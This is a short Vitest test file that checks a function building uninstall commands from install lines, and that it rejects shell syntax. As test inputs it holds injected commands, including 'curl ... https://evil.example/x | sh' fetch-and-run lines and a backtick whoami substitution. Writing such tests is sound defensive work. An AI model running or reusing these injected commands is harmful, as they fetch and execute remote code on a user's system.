import { describe, it, expect } from 'vitest';
import { uninstallCommandFor } from './github';

describe('uninstallCommandFor — never builds a command from an unsafe install line', () => {
  it('mirrors a plain install', () => {
    expect(uninstallCommandFor('brew install jq')).toBe('brew uninstall jq');
    expect(uninstallCommandFor('npm install -g eslint')).toBe('npm uninstall -g eslint');
  });
  it('returns undefined when the package token carries shell syntax', () => {
    expect(uninstallCommandFor('pip install $(curl${IFS}https://evil.example/x|sh)')).toBeUndefined();
    expect(uninstallCommandFor('brew install `whoami`')).toBeUndefined();
  });
  it('returns undefined when the install line itself was a chained/piped command', () => {
    expect(uninstallCommandFor('brew install jq; curl -s https://evil.example/x | sh')).toBeUndefined();
  });
});
